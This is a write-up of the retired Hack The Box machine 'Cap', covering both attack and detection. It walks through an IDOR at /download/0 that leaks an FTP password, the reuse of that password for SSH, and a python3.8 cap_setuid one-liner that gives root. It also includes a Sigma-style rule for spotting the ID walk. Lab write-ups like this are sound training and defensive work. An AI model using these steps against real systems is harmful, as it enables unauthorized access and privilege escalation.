---
title: 'Cap'
summary: 'An IDOR in the dashboard capture listing hands over an old pcap with a clear-text FTP login; the reused password opens SSH, and a cap_setuid capability on python3.8 gives root. For the blue team, the signal is one client walking /download/ through sequential IDs, including 0.'
lang: en
type: writeup
platform: htb
htbKind: machine
difficulty: easy
os: linux
retiredOn: 2021-10-02
publishedOn: 2026-11-22
attack: [T1190, T1552.001, T1078, T1548.001]
timeline:
  - title: Recon
    detail: 'nmap shows 21 (FTP), 22 (SSH) and 80 (HTTP). Port 80 is a Flask "Security Dashboard" that generates traffic captures, each at /download/<id>.'
  - title: 'Foothold — IDOR at /download/0'
    detail: 'The capture ID is sequential in the URL. Switching to /download/0 returns an old capture with a clear-text FTP login.'
    attack: [T1190, T1552.001]
  - title: 'SSH with a reused credential'
    detail: 'The FTP password also works on SSH. Shell as nathan.'
    attack: [T1078]
  - title: 'Privesc — cap_setuid capability'
    detail: 'getcap shows cap_setuid+eip on /usr/bin/python3.8. os.setuid(0) then a shell becomes root with no password.'
    attack: [T1548.001]
detection:
  level: 1
  telemetry:
    - 'HTTP access log (gunicorn/nginx): GET /download/<id> requests with session id and response code'
    - 'auth.log (sshd): Accepted password, with user and source IP'
    - 'auditd: python3.8 execve and the uid transition to 0 (setuid syscall)'
  logic: |
    title: Sequential ID walk over /download/ (IDOR)
    logsource: { category: webserver }
    detection:
      selection: { cr_uri_path|startswith: '/download/' , sc_status: 200 }
      condition: selection
    correlation:
      group-by: [src_ip]
      timespan: 5m
      condition: count(distinct cr_uri_path) >= 10
  notes: 'Level 1: the logic has not been run against real logs yet. The threshold of 10 distinct IDs in 5 min is a first guess; a hit on /download/0 from a session that does not own it is already suspicious on its own.'
---

> Retired Hack The Box machine. No flags. The credential below is publicly known and is part of the IDOR vector.

## Recon

`nmap` showed **21 (FTP)**, **22 (SSH)** and **80 (HTTP)**. Port 80 was a Flask "Security Dashboard" that generated traffic captures. Each report lived at `/download/<id>`.

## Foothold — IDOR

The dashboard gives you captures for *your* ID, but the ID is sequential in the URL. Switching to **`/download/0`** returned an old capture with a clear-text FTP login:

```text
nathan:Buck3tH4TF0RM3!
```

The password was reused on SSH:

```bash
ssh nathan@target
```

The mistake I nearly made was trying to *sniff* a live FTP login by regenerating captures. The bug was IDOR: reading captures that **already existed** at low IDs.

> The rule that stuck: **sequential ID in the URL → test the neighbours and `0` first.**

## Privesc — Linux capability

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid+eip
```

A binary with `cap_setuid` lets you change uid with no password:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Chain: **IDOR → credential in the pcap → SSH → capability abuse**.

## The blue-team view

The foothold exploits no memory bug and sends no exotic payload: these are valid HTTP requests. What stands out is the **access pattern** — one source asking for `/download/0`, `/download/1`, `/download/2`… in sequence, including IDs that do not belong to its session. That is what the rule above looks for.

The capability is the harder part to catch from application logs: the reliable signal comes from the host, in `auditd`, watching `python3.8` make the `setuid(0)` syscall from a process that was not root.
